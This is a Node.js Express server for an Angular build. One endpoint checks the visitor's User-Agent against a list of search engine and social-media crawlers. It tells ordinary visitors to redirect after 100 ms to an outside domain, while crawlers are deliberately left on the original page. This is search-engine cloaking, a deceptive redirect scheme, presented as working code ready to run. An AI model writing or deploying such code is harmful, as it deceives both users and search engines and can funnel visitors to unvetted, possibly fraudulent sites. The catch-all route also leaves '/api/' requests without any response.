const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 4000;
const DIST_FOLDER = path.join(__dirname, 'dist/angular-ssr-metadata/browser');

// Detect search engine crawlers
function isSearchEngine(userAgent) {
  const searchEngines = [
    'googlebot',
    'bingbot',
    'yandexbot',
    'duckduckbot',
    'slurp',
    'baiduspider',
    'facebookexternalhit',
    'twitterbot'
  ];
  
  return searchEngines.some(crawler => 
    userAgent && userAgent.toLowerCase().includes(crawler.toLowerCase())
  );
}

// Serve static files
app.use(express.static(DIST_FOLDER));

// API endpoint for redirect info
app.get('/api/redirect-info', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  const isBot = isSearchEngine(userAgent);
  
  res.json({
    shouldRedirect: !isBot, // Don't redirect search engines
    targetUrl: 'https://p1.saffa-sell.com',
    delay: 100 // milliseconds
  });
});

// All other routes serve index.html
app.get('*', (req, res) => {
  if (req.path.startsWith('/api/')) {
    return;
  }
  
  const indexPath = path.join(DIST_FOLDER, 'index.html');
  fs.readFile(indexPath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading index.html:', err);
      return res.status(500).send('Error loading application');
    }
    
    res.send(data);
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Visit: http://localhost:${PORT}`);
});
